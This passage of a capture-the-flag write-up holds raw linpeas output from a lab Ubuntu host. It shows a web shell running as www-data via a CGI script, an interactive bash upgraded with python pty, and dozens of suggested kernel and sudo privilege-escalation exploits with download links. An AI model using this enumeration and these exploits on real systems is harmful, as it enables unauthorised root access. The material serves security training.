UUID=df519a5f-788a-4510-8e6c-4492ef33f232       /       ext4    errors=remount-ro       0 1                                               
UUID=13e22641-7ee1-41dd-9123-168df0e56f11       none    swap    sw      0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                   
HISTFILESIZE=0                                                                                                                            
SHLVL=2
OLDPWD=/home/ryan
HTTP_ACCEPT=*/*
HTTP_HOST=10.10.249.163
_=./linpeas.sh
HISTSIZE=0
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed                                    
dmesg Not Found                                                                                                                           
                                                                                                                                          
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                        
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: probable
   Tags: [ ubuntu=(14.04|15.10) ]{kernel:4.2.0-(18|19|20|21|22)-generic}
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Exposure: less probable
   Tags: RHEL<=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2015-3290] espfix64_NMI

   Details: http://www.openwall.com/lists/oss-security/2015/08/04/8
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/37722

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2014-0038] timeoutpwn

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Exposure: less probable
   Tags: ubuntu=13.10
   Download URL: https://www.exploit-db.com/download/31346
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2014-0038] timeoutpwn 2

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Exposure: less probable
   Tags: ubuntu=(13.04|13.10){kernel:3.(8|11).0-(12|15|19)-generic}
   Download URL: https://www.exploit-db.com/download/31347
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                   
  [1] exploit_x                                                                                                                           
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [2] overlayfs
      CVE-2015-8660
      Source: http://www.exploit-db.com/exploits/39230
  [3] pp_key
      CVE-2016-0728
      Source: http://www.exploit-db.com/exploits/39277
  [4] timeoutpwn
      CVE-2014-0038
      Source: http://www.exploit-db.com/exploits/31346

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                             
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                         
═╣ Execshield enabled? ............ Execshield Not Found                                                                                  
═╣ SELinux enabled? ............... sestatus Not Found                                                                                    
═╣ Is ASLR enabled? ............... Yes                                                                                                   
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes                                                                                                   

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════                                   
                                             ╚═══════════╝                                                                                
╔══════════╣ Container related tools present
╔══════════╣ Container details                                                                                                            
═╣ Is this a container? ........... No                                                                                                    
═╣ Any running containers? ........ No                                                                                                    
                                                                                                                                          

                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════                                    
                          ╚════════════════════════════════════════════════╝                                                              
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes               
root         1  0.0  0.2  33388  2648 ?        Ss   19:10   0:01 /sbin/init                                                               
root       312  0.0  0.1  19740  1060 ?        S    19:10   0:00 upstart-udev-bridge --daemon[0m
root       317  0.0  0.1  51504  1836 ?        Ss   19:10   0:00 /lib/systemd/systemd-udevd --daemon
root       401  0.0  0.0  15280   412 ?        S    19:10   0:00 upstart-file-bridge --daemon[0m
message+   403  0.0  0.1  39116  1024 ?        Ss   19:10   0:00 dbus-daemon --system --fork
root       418  0.0  0.1  35028  1568 ?        Ss   19:10   0:00 /lib/systemd/systemd-logind
syslog     474  0.0  0.1 255844  1368 ?        Ssl  19:10   0:00 rsyslogd
root       533  0.0  0.0  15264   396 ?        S    19:10   0:00 upstart-socket-bridge --daemon[0m
root       582  0.0  0.2  10232  2808 ?        Ss   19:10   0:00 dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root       724  0.0  0.0  15820   960 tty4     Ss+  19:10   0:00 /sbin/getty -8 38400 tty4
root       726  0.0  0.0  15820   944 tty5     Ss+  19:10   0:00 /sbin/getty -8 38400 tty5
root       729  0.0  0.0  15820   952 tty2     Ss+  19:10   0:00 /sbin/getty -8 38400 tty2
root       730  0.0  0.0  15820   948 tty3     Ss+  19:10   0:00 /sbin/getty -8 38400 tty3
root       732  0.0  0.0  15820   956 tty6     Ss+  19:10   0:00 /sbin/getty -8 38400 tty6
root       748  0.0  0.2  61368  3036 ?        Ss   19:10   0:00 /usr/sbin/sshd -D
root       772  0.0  0.0  23656   880 ?        Ss   19:10   0:00 cron
root       878  0.0  0.2  75520  2672 ?        Ss   19:10   0:00 /usr/sbin/apache2 -k start
www-data   881  0.0  0.1  75260  1736 ?        S    19:10   0:00  _ /usr/sbin/apache2 -k start
www-data   882  0.0  0.4 561452  4984 ?        Sl   19:10   0:00  _ /usr/sbin/apache2 -k start
www-data  1040  0.0  0.1   9512  1148 ?        S    19:35   0:00  |   _ /bin/bash /usr/lib/cgi-bin/test.cgi
www-data  1041  0.0  0.1  18148  1960 ?        S    19:35   0:00  |       _ /bin/bash -i
www-data  1051  0.0  0.5  35268  5796 ?        S    19:38   0:00  |           _ python3 -c import pty;pty.spawn("/bin/bash")
www-data  1052  0.0  0.1  18148  1952 pts/0    Ss   19:38   0:00  |               _ /bin/bash
www-data  1063  0.3  0.1   5276  1528 pts/0    S+   19:43   0:00  |                   _ /bin/sh ./linpeas.sh
www-data  5317  0.0  0.0   5276   928 pts/0    S+   19:44   0:00  |                       _ /bin/sh ./linpeas.sh
www-data  5321  0.0  0.1  15724  1216 pts/0    R+   19:44   0:00  |                       |   _ ps fauxwww
www-data  5320  0.0  0.0   5276   928 pts/0    S+   19:44   0:00  |                       _ /bin/sh ./linpeas.sh
www-data   883  0.0  0.4 495844  4976 ?        Sl   19:10   0:00  _ /usr/sbin/apache2 -k start
root       962  0.0  0.0  15820   944 tty1     Ss+  19:11   0:00 /sbin/getty -8 38400 tty1

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                              
                                                                                                                                          
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                        
COMMAND    PID TID       USER   FD      TYPE DEVICE SIZE/OFF    NODE NAME                                                                 

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                                        
gdm-password Not Found                                                                                                                    
gnome-keyring-daemon Not Found                                                                                                            
lightdm Not Found                                                                                                                         
vsftpd Not Found                                                                                                                          
apache2 process found (dump creds from memory as root)                                                                                    
sshd Not Found
                                                                                                                                          
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                    
/usr/bin/crontab                                                                                                                          
incrontab Not Found
-rw-r--r-- 1 root root     722 Feb  8  2013 /etc/crontab                                                                                  

/etc/cron.d:
total 12
drwxr-xr-x  2 root root 4096 Sep  2  2020 .
drwxr-xr-x 86 root root 4096 Jan  7 19:10 ..
-rw-r--r--  1 root root  102 Feb  8  2013 .placeholder

/etc/cron.daily:
total 68
drwxr-xr-x  2 root root  4096 Sep  2  2020 .
drwxr-xr-x 86 root root  4096 Jan  7 19:10 ..
-rw-r--r--  1 root root   102 Feb  8  2013 .placeholder
-rwxr-xr-x  1 root root   625 Apr  3  2019 apache2
-rwxr-xr-x  1 root root 15481 Apr 10  2014 apt
-rwxr-xr-x  1 root root   314 Feb 17  2014 aptitude
-rwxr-xr-x  1 root root   355 Jun  4  2013 bsdmainutils
-rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg
-rwxr-xr-x  1 root root   372 Jan 22  2014 logrotate
-rwxr-xr-x  1 root root  1261 Apr 10  2014 man-db
-rwxr-xr-x  1 root root   435 Jun 20  2013 mlocate
-rwxr-xr-x  1 root root   249 Feb 16  2014 passwd
-rwxr-xr-x  1 root root  2417 May 13  2013 popularity-contest
-rwxr-xr-x  1 root root   328 Jul 18  2014 upstart

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Sep  2  2020 .
drwxr-xr-x 86 root root 4096 Jan  7 19:10 ..
-rw-r--r--  1 root root  102 Feb  8  2013 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Sep  2  2020 .
drwxr-xr-x 86 root root 4096 Jan  7 19:10 ..
-rw-r--r--  1 root root  102 Feb  8  2013 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 Sep  2  2020 .
drwxr-xr-x 86 root root 4096 Jan  7 19:10 ..
-rw-r--r--  1 root root  102 Feb  8  2013 .placeholder
-rwxr-xr-x  1 root root  730 Feb 23  2014 apt-xapian-index
-rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim
-rwxr-xr-x  1 root root  771 Apr 10  2014 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                            
                                                                                                                                          
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                               
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                 
                                                                                                                                          
╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                                 
                                                                                                                                          
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket                                        
/lib/systemd/system/dbus.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                
/com/ubuntu/upstart
/dev/log
  └─(Read Write)
/run/apache2/cgisock.878
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/udev/control
  └─(Read )
/var/run/apache2/cgisock.878
  └─(Read Write)
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                  
                                                                                                                                          
╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                  
busctl Not Found                                                                                                                          
                                                                                                                                          

                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════                                   
                                        ╚═════════════════════╝                                                                           
╔══════════╣ Hostname, hosts and DNS
ubuntu                                                                                                                                    
127.0.0.1       localhost
127.0.1.1       ubuntu

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

╔══════════╣ Interfaces
```
```text
# 0day — Writeup
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:e0:42:47:18:a7  
          inet addr:10.10.249.163  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::e0:42ff:fe47:18a7/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:1108 errors:0 dropped:0 overruns:0 frame:0
          TX packets:892 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:849336 (849.3 KB)  TX bytes:268891 (268.8 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                             
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                         
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                        
                                                                                                                                          

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════                                   
                                         ╚═══════════════════╝                                                                            
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                  
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                     

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                              
netpgpkeys Not Found
netpgp Not Found                                                                                                                          
                                                                                                                                          
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                          

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                    
ptrace protection is enabled (1)                                                                                                          
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                
                                                                                                                                          
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                           

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                           
ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                    
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=1000(ryan) gid=1000(ryan) groups=1000(ryan)
uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)
uid=102(messagebus) gid=105(messagebus) groups=105(messagebus)
uid=103(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 19:44:07 up 33 min,  0 users,  load average: 0.08, 0.03, 0.05                                                                            
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
                                                                                                                                          
wtmp begins Sat Jan  7 19:10:55 2023

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                         

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                          
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                          

                                       ╔══════════════════════╗                                                                           
═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════                                    
                                       ╚══════════════════════╝                                                                           
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                           
/usr/bin/curl
/usr/bin/gcc
/bin/nc
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  gcc                                 4:4.8.2-1ubuntu6              amd64        GNU C compiler                                         
ii  gcc-4.8                             4.8.4-2ubuntu1~14.04.4        amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Searching mysql credentials and exec
                                                                                                                                          
╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.7 (Ubuntu)                                                                                     
Server built:   Apr  3 2019 18:04:25
httpd Not Found
                                                                                                                                          
Nginx version: nginx Not Found
                                                                                                                                          
./linpeas.sh: 2593: ./linpeas.sh: grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null: not found
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Sep  2  2020 /etc/apache2/sites-enabled                                                                       
drwxr-xr-x 2 root root 4096 Sep  2  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Sep  2  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 1332 Nov 26  2018 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Sep  2  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Apr 17  2014 /usr/share/doc/rsync/examples/rsyncd.conf                                                        
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                      
drwxr-xr-x 2 root root 4096 Sep  2  2020 /etc/ldap

╔══════════╣ Searching ssl/ssh files
Port 22                                                                                                                                   
PermitRootLogin without-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
./linpeas.sh: 2779: ./linpeas.sh: gpg-connect-agent: not found
══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config                                                                                        
AuthorizedKeysFile      .ssh/authorized_keys
UsePrivilegeSeparation sandbox          # Default for new installations.
Subsystem       sftp    /usr/libexec/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                          

Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep  2  2020 /etc/pam.d                                                                                       
-rw-r--r-- 1 root root 2139 May  2  2014 /etc/pam.d/sshd

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep  2  2020 /usr/share/keyrings                                                                              
drwxr-xr-x 2 root root 4096 Sep  2  2020 /var/lib/apt/keyrings

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                            
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                              
gpg Not Found
netpgpkeys Not Found                                                                                                                      
netpgp Not Found                                                                                                                          
                                                                                                                                          
-rw-r--r-- 1 root root 12335 Jul 22  2014 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 1724 Jun 13  2014 /usr/share/apt/ubuntu-archive.gpg
-rw-r--r-- 1 root root 12335 May 18  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 18  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 18  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 12335 Jul 22  2014 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 933 May  8  2014 /var/lib/apt/lists/us.archive.ubuntu.com_ubuntu_dists_trusty_Release.gpg
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
